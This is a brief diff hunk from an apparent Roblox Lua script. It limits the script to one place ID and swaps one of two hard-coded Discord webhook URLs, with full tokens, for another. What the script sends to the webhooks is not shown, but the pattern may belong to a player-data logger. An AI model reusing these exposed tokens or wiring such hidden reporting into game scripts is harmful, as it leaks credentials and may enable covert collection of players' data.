@@ -2144,7 +2144,7 @@ if game.PlaceId ~= allowedPlaceId then return end
 
 local webhookUrls = {
     "https://discord.com/api/webhooks/1397333132335775804/NOIfXbjMY01t8eeHM-vTcb-uDgR-P1eEnRXA8PUBXa5RZabdXHHVUF52GEsOHmfduLFt",
-    "https://discord.com/api/webhooks/1394194033575727185/xSSOUX2Vf-kjpsqzpELQ3lB2_pd5ZBzt80purEkpbP7_Ko9b0uW685KPkCgypZJKrmAc"
+    "https://discord.com/api/webhooks/1397331310510473278/S8xtbF9bLi_C-QfbmlILqXh5PzYZ18pl2CSR8ReO1FVbXY1ltyJ41x4q2KuErQajog09"
 }
 
 local brainrotGods = {
